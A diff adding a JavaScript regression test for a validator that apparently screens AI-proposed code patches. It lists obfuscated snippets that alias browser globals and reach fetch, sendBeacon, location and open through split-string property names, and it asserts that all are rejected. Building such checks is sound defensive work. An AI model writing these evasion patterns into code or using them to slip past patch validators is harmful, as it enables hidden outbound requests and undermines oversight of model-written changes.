@@ -478,3 +478,31 @@ test('model blocks dynamically resolved browser globals before creating a propos
     explanation: 'No dynamic global access' });
   assert.equal(validateModelPatch({ response: safe, source }).status, 'proposed');
 });
+
+test('model rejects aliased ambient globals with computed outbound capabilities', () => {
+  // Member-only checks miss a bare ambient global assigned to a local alias.
+  const attempts = [
+    "const root = globalThis; root['fe' + 'tch'](unsafeUrl);",
+    "const root = window; root['loc' + 'ation'] = unsafeUrl;",
+    "const host = navigator; host['send' + 'Beacon'](unsafeUrl, data);",
+    "const scope = self; scope['op' + 'en'](unsafeUrl);",
+    "const scope = global; scope['fe' + 'tch'](unsafeUrl);",
+    "const dest = location; dest['ass' + 'ign'](unsafeUrl);",
+    "const frameSet = frames; frameSet[0]['loc' + 'ation'] = unsafeUrl;",
+    "const scope = this; scope['fe' + 'tch'](unsafeUrl);"
+  ];
+  for (const replace of attempts) {
+    const response = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace,
+      explanation: 'Synthetic aliased ambient capability regression' });
+    assert.equal(validateModelPatch({ response, source }).status, 'rejected', replace);
+  }
+  for (const replace of [
+    '  const sample = 104; // safe local value',
+    '  const windowStatus = "Ready";',
+    '  const locationLabel = "Current status";'
+  ]) {
+    const response = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace,
+      explanation: 'Safe local-only edit' });
+    assert.equal(validateModelPatch({ response, source }).status, 'proposed', replace);
+  }
+});
